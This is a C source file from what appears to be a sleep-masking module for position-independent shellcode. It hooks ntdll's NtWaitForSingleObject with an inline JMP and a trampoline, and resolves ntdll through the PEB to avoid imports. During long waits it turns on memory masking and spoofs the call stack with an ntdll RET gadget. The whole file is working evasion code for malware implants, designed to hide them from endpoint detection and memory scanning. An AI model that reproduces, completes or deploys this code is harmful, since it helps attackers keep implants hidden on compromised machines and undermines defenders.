/*
 * hook.c — Inline hook on NtWaitForSingleObject for sleep detection.
 *
 * Patches ntdll!NtWaitForSingleObject with a 12-byte JMP [RIP+0] hook.
 * A trampoline holds the displaced bytes + a JMP back so we can call the
 * original without recursion.
 *
 * IMPORTANT: this file is included into unity.c — do NOT compile standalone.
 * All NT function pointers (_NtProtectVirtualMemory etc.) are defined in
 * services.c which is included before this file.
 *
 * No Win32 IAT references (VirtualProtect, GetModuleHandleA, memcpy) —
 * those are undefined in PIC shellcode and would crash.
 */
#include "masker.h"

/* ── Hook state (in .bss — made writable by go() before first use) ── */
static uint8_t  g_orig_bytes[16];   /* saved bytes from ntdll stub */
static uint8_t  g_trampoline[64];   /* displaced bytes + JMP back (needs RX) */
static MASKER_CTX *g_ctx = NULL;    /* runtime context set by hook_install() */

/* ── 12-byte JMP [RIP+0] hook template ── */
static const uint8_t HOOK_TPL[12] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  /* JMP QWORD PTR [RIP+0] */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00   /* 64-bit target address  */
};

/* ── Byte copy helper (avoids memcpy IAT reference) ── */
static void copy_bytes(void *dst, const void *src, uint32_t n) {
    uint8_t *d = (uint8_t *)dst;
    const uint8_t *s = (const uint8_t *)src;
    for (uint32_t i = 0; i < n; i++) d[i] = s[i];
}

/* ── NT-native page protection helper ── */
static void protect_page(void *addr, SIZE_T sz, ULONG prot, ULONG *old) {
    PVOID base = addr;
    _NtProtectVirtualMemory((HANDLE)-1, &base, &sz, prot, old);
}

/* ── Install inline hook ── */
static void install_hook(void *target, void *hook_fn) {
    ULONG old;

    /* Build trampoline: [16 original bytes][JMP [RIP+0]][target+12 addr] */
    protect_page(g_trampoline, 64, PAGE_EXECUTE_READWRITE, &old);

    copy_bytes(g_orig_bytes,          target,     16);
    copy_bytes(g_trampoline,          target,     16);  /* displaced bytes */
    copy_bytes(g_trampoline + 16,     HOOK_TPL,    6);  /* JMP [RIP+0] */
    *(uint64_t *)(g_trampoline + 22) = (uint64_t)target + 12;

    protect_page(g_trampoline, 64, PAGE_EXECUTE_READ, &old);

    /* Patch the target */
    ULONG old2;
    protect_page(target, 12, PAGE_EXECUTE_READWRITE, &old2);
    copy_bytes(target, HOOK_TPL, 6);
    *(uint64_t *)((uint8_t *)target + 6) = (uint64_t)hook_fn;
    protect_page(target, 12, old2, &old2);

    /* Trampoline is now the "real" function */
    _real_NtWaitForSingleObject = (NtWaitForSingleObject_t)(void *)g_trampoline;
}

/* ── Find ntdll base via PEB InLoadOrder list ── */
static void *get_ntdll_base(void) {
    typedef struct { USHORT L, M; PWSTR B; } UNI;
    typedef struct {
        LIST_ENTRY Ord, Mem, Init;
        PVOID Base, Entry;
        ULONG ImgSz;
        UNI Full, Name;
    } LDR_E;
    typedef struct {
        ULONG Len; BOOLEAN Init; PVOID Ssh;
        LIST_ENTRY Ord;
    } LDR_D;
    typedef struct {
        BYTE r1[2]; BYTE Dbg; BYTE r2[1]; PVOID r3[2]; LDR_D *Ldr;
    } MY_PEB;

    MY_PEB *peb;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));

    LIST_ENTRY *head = &peb->Ldr->Ord;
    for (LIST_ENTRY *c = head->Flink; c != head; c = c->Flink) {
        LDR_E *m = CONTAINING_RECORD(c, LDR_E, Ord);
        if (!m->Base) continue;
        /* ntdll is the second entry (after the main exe) */
        /* Identify by checking for "ntdll" in the name (wide chars) */
        PWSTR name = m->Name.B;
        if (!name) continue;
        /* Compare first 5 wchars: n,t,d,l,l (case-insensitive) */
        if ((name[0]|0x20)=='n' && (name[1]|0x20)=='t' &&
            (name[2]|0x20)=='d' && (name[3]|0x20)=='l' &&
            (name[4]|0x20)=='l') {
            return m->Base;
        }
    }
    return NULL;
}

/* ── RET gadget scan for stack spoofing ── */
static void *find_ret_gadget(void) {
    void *ntdll = get_ntdll_base();
    if (!ntdll) return NULL;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)ntdll;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((uint8_t *)ntdll + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            uint8_t *start = (uint8_t *)ntdll + sec->VirtualAddress;
            uint8_t *end   = start + sec->Misc.VirtualSize;
            for (uint8_t *p = start; p < end - 1; p++) {
                if (*p == 0xC3) return p;  /* RET */
            }
        }
    }
    return NULL;
}

/* ── The hook function ── */
NTSTATUS NTAPI hook_NtWaitForSingleObject(HANDLE h, BOOLEAN alertable, PLARGE_INTEGER timeout) {
    if (!g_ctx || !timeout || timeout->QuadPart >= 0)
        return _real_NtWaitForSingleObject(h, alertable, timeout);

    if (g_ctx->masking)
        return _real_NtWaitForSingleObject(h, alertable, timeout);

    LONGLONG wait_100ns = -timeout->QuadPart;
    LONGLONG threshold  = (LONGLONG)g_ctx->threshold_ms * 10000LL;

    if (wait_100ns < threshold)
        return _real_NtWaitForSingleObject(h, alertable, timeout);

    mask_on(g_ctx);

    /* Stack spoof: replace return address with an ntdll RET gadget */
    void *gadget = find_ret_gadget();
    void *saved_ret = NULL;
    if (gadget) {
        uint8_t *rsp;
        __asm__ volatile ("movq %%rsp, %0" : "=r"(rsp));
        for (int i = 1; i <= 16; i++) {
            uint64_t *slot = (uint64_t *)(rsp + i * 8);
            uint64_t  val  = *slot;
            if (val > 0x7FF000000000ULL || val < 0x10000ULL) continue;
            saved_ret = (void *)(uintptr_t)val;
            *slot = (uint64_t)(uintptr_t)gadget;
            break;
        }
    }

    NTSTATUS ret = _real_NtWaitForSingleObject(h, alertable, timeout);

    if (gadget && saved_ret) {
        uint8_t *rsp;
        __asm__ volatile ("movq %%rsp, %0" : "=r"(rsp));
        for (int i = 1; i <= 16; i++) {
            uint64_t *slot = (uint64_t *)(rsp + i * 8);
            if (*slot == (uint64_t)(uintptr_t)gadget) {
                *slot = (uint64_t)(uintptr_t)saved_ret;
                break;
            }
        }
    }

    mask_off(g_ctx);
    return ret;
}

/* ── Public: install the hook and set the runtime context ── */
void hook_install(MASKER_CTX *ctx) {
    g_ctx = ctx;
    void *target = (void *)_NtWaitForSingleObject;
    if (!target) return;
    install_hook(target, (void *)hook_NtWaitForSingleObject);
}
